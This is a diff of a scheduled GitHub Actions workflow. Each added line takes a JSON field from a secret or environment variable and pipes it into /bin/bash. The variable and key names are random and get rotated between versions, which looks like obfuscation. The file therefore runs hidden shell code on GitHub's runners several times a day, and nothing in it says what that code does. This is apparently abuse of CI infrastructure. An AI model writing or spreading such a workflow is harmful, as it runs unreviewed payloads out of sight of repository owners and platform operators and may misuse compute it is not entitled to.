@@ -3,31 +3,28 @@ name: renzonglyh
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 5/6 * * *'
+    - cron: '9 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: renzonglyh
         env:
-          yqd25586: ${{ secrets.yqd25586 }}
+          qtfhb66122: ${{ secrets.qtfhb66122 }}
         run: |
-          echo $yqd25586 | jq -r .w4 | /bin/bash
-          echo $wm50 | jq -r .rshmr36 | /bin/bash
-          echo $rouoz92 | jq -r .q0 | /bin/bash
-          echo $dmqne82714 | jq -r .ro966 | /bin/bash
-          echo $an43968 | jq -r .grmwz6194 | /bin/bash
-          echo $wuz27 | jq -r .z867 | /bin/bash
-          echo $f5 | jq -r .nuo86117 | /bin/bash
-          echo $ztrr342 | jq -r .l27 | /bin/bash
-          echo $m39 | jq -r .z2 | /bin/bash
-          echo $wagl0 | jq -r .rtrdv2035 | /bin/bash
-          echo $ms2 | jq -r .i11851 | /bin/bash
-          echo $enlv94 | jq -r .apkwp60 | /bin/bash
-          echo $vo04485 | jq -r .wbt5354 | /bin/bash
-          echo $tsdxk323 | jq -r .hs32 | /bin/bash
-          echo $tqbpi777 | jq -r .qfyse153 | /bin/bash
-          echo $hd0028 | jq -r .inw2528 | /bin/bash
+          echo $qtfhb66122 | jq -r .oh46 | /bin/bash
+          echo $hq4 | jq -r .uzepd853 | /bin/bash
+          echo $cr9 | jq -r .jk553 | /bin/bash
+          echo $zf8929 | jq -r .nu35258 | /bin/bash
+          echo $bstp9640 | jq -r .ul233 | /bin/bash
+          echo $wbz1318 | jq -r .aqna3 | /bin/bash
+          echo $zzh82567 | jq -r .npvl16834 | /bin/bash
+          echo $xqwb93 | jq -r .vz904 | /bin/bash
+          echo $ho48 | jq -r .oi34 | /bin/bash
+          echo $fdxuj34 | jq -r .g279 | /bin/bash
+          echo $xze424 | jq -r .cykk22317 | /bin/bash
+          echo $omsbc3 | jq -r .d8010 | /bin/bash
+          echo $k95 | jq -r .oaqss79 | /bin/bash
+          echo $mxzd00065 | jq -r .ymal03762 | /bin/bash
 
